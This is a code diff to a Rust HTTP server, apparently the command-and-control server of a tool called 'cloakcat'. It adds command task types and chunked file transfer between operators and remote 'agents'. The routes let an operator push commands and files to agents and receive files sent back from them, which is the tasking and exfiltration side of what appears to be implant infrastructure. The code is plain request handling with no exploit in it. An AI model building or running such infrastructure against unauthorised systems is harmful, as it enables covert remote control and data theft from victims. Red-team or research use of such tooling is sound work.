@@ -1,12 +1,15 @@
 //! Thin HTTP handlers — extract params, delegate to service, format response.
 
 use axum::{
+    body::Bytes,
     extract::{OriginalUri, Path, Query, State},
     http::{HeaderMap, StatusCode},
     response::IntoResponse,
     Json,
 };
 use serde::Deserialize;
+
+use cloakcat_protocol::{FileChunk, TaskType};
 
 use crate::error::ServerError;
 use crate::service;
@@ -18,6 +21,18 @@ use crate::validation::validate_profile;
 #[derive(Deserialize)]
 pub struct PushCmdReq {
     pub command: String,
+    #[serde(default)]
+    pub task_type: TaskType,
+}
+
+#[derive(Deserialize)]
+pub struct UploadChunkReq {
+    pub transfer_id: String,
+    pub path: String,
+    pub seq: u32,
+    pub total: u32,
+    /// Base64-encoded chunk bytes.
+    pub data: String,
 }
 
 #[derive(Deserialize)]
@@ -178,6 +193,60 @@ pub async fn push_command_handler(
     State(state): State<AppState>,
     Json(req): Json<PushCmdReq>,
 ) -> Result<Json<serde_json::Value>, ServerError> {
-    service::push_command(&state, &agent_id, &req.command).await?;
+    service::push_command(&state, &agent_id, &req.command, req.task_type).await?;
     Ok(Json(serde_json::json!({ "status": "ok" })))
+}
+
+// ========== Transfer routes (operator-facing) ==========
+
+/// POST /v1/transfer/upload-chunk/{agent_id} — CLI sends a file chunk to server.
+pub async fn upload_chunk_handler(
+    Path(agent_id): Path<String>,
+    State(state): State<AppState>,
+    Json(req): Json<UploadChunkReq>,
+) -> Result<Json<serde_json::Value>, ServerError> {
+    let complete = service::receive_upload_chunk(
+        &state,
+        &agent_id,
+        &req.transfer_id,
+        &req.path,
+        req.seq,
+        req.total,
+        &req.data,
+    )
+    .await?;
+    Ok(Json(serde_json::json!({ "status": "ok", "complete": complete })))
+}
+
+/// GET /v1/transfer/download-result/{transfer_id} — CLI polls for assembled download.
+/// Returns 200 + raw bytes when ready, 202 when still in progress.
+pub async fn get_download_handler(
+    Path(transfer_id): Path<String>,
+    State(state): State<AppState>,
+) -> Result<impl IntoResponse, ServerError> {
+    match service::get_download_bytes(&state, &transfer_id).await? {
+        Some(bytes) => Ok((StatusCode::OK, Bytes::from(bytes)).into_response()),
+        None => Ok((StatusCode::ACCEPTED, Json(serde_json::json!({ "status": "pending" }))).into_response()),
+    }
+}
+
+// ========== Transfer routes (agent-facing) ==========
+
+/// GET /v1/transfer/upload-file/{transfer_id} — agent fetches assembled upload file.
+pub async fn get_upload_file_handler(
+    Path(transfer_id): Path<String>,
+    State(state): State<AppState>,
+) -> Result<impl IntoResponse, ServerError> {
+    let bytes = service::get_upload_bytes(&state, &transfer_id).await?;
+    Ok((StatusCode::OK, Bytes::from(bytes)).into_response())
+}
+
+/// POST /v1/transfer/download-chunk/{agent_id} — agent sends a download chunk.
+pub async fn download_chunk_handler(
+    Path(_agent_id): Path<String>,
+    State(state): State<AppState>,
+    Json(chunk): Json<FileChunk>,
+) -> Result<Json<serde_json::Value>, ServerError> {
+    let complete = service::receive_download_chunk(&state, &chunk).await?;
+    Ok(Json(serde_json::json!({ "status": "ok", "complete": complete })))
 }
